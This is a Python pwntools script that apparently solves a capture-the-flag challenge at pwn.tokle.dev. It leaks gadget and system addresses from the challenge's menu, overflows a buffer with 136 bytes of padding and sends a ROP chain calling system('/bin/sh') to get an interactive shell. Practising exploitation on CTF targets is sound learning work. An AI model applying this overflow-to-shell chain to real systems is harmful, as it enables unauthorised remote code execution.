from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1342)

# Receive all the output text from the program
io.recvuntil(b"Good luck!")

def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx

def add_str(string):
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"String: ", string)
    io.recvuntil(b"String at: ")
    return int(io.recvline().strip(), 16)

def get_symbol_addr(symbol):
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"Symbol: ", symbol.encode())
    io.recvuntil(f"{symbol}: ".encode())
    return int(io.recvline().strip(), 16)

# Get address of gadgets
pop_rdi, pop_rsi, pop_rdx = get_gadgets()
log.success(f"Pop RDI @ {hex(pop_rdi)}")
log.success(f"Pop RSI @ {hex(pop_rsi)}")
log.success(f"Pop RDX @ {hex(pop_rdx)}")

# Add "/bin/sh" string
binsh = add_str(b"/bin/sh")
log.success(f"/bin/sh @ {hex(binsh)}")

# Get address of "system" function
system = get_symbol_addr("system")
log.success(f"system @ {hex(system)}")

# ROP to get shell
payload = b"A"*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi+1) # ret gadget
payload += p64(system)

# Send and trigger payload
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)
io.sendlineafter(b"> ", b"8")

io.interactive()
